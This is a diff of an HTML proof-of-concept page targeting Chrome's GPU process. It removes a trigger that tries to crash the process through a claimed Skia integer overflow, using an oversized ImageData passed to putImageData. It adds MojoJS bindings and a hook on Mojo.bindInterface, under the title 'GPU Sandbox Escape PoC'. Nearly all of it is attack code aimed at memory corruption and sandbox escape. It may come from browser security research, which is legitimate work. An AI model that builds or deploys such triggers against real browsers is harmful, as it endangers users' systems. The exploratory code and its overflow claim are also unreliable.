@@ -1,37 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GPU OOB Write Trigger</title>
+    <title>GPU Sandbox Escape PoC</title>
+    
+    <!-- ES6 Import Map: Paths MUST start with ./ -->
+    <script type="importmap">
+        {
+            "imports": {
+                "mojo_bindings": "gen/mojo/public/js/bindings.js",
+                "gpu_channel": "gen/gpu/ipc/common/gpu_channel.mojom.js"
+            }
+        }
+    </script>
 </head>
 <body>
-    <h1>Attempting to crash GPU Process... Check chrome://crashes</h1>
+    <h1>MojoJS ES6 Module Loader</h1>
     <canvas id="target-canvas" width="10" height="10"></canvas>
     
-    <script>
+    <!-- MUST use type="module" when using imports -->
+    <script type="module">
+        import { Mojo } from 'mojo_bindings';
+        
+        console.log("[+] Mojo API loaded successfully: ", Mojo);
+
+        // Let's see if we can intercept the GPU channel creation natively
+        const original_bind = Mojo.bindInterface;
+        Mojo.bindInterface = function(interfaceName, pipe, host) {
+            console.log("[*] Intercepted Mojo Interface: " + interfaceName);
+            return original_bind(interfaceName, pipe, host);
+        };
+
         setTimeout(() => {
-            console.log("[*] Initializing...");
+            console.log("[*] Initializing Canvas to trigger IPC...");
             const canvas = document.getElementById('target-canvas');
-            const ctx = canvas.getContext('2d', { willReadFrequently: true });
-            
-            try {
-                // The Magic Number: 0x20000000
-                // 0x20000000 * 4 bytes/pixel = 0x80000000 bytes.
-                // This triggers the SkTFitsIn<int32_t> integer overflow in Skia!
-                console.log("[*] Attempting to create massive ImageData...");
-                const massive_width = 0x20000000;
-                
-                // We create a tiny array but force the width parameter
-                const imgData = new ImageData(massive_width, 1);
-                
-                console.log("[+] ImageData created! Sending to GPU...");
-                
-                // This sends the WritePixels command to the GPU process
-                ctx.putImageData(imgData, 0, 0);
-                
-                console.log("[!] Command sent! If the GPU process crashes, you have the bug!");
-            } catch (e) {
-                console.log("[-] Blink blocked it: " + e.message);
-            }
+            const ctx = canvas.getContext('2d');
+            ctx.fillRect(0, 0, 10, 10);
         }, 1000);
     </script>
 </body>
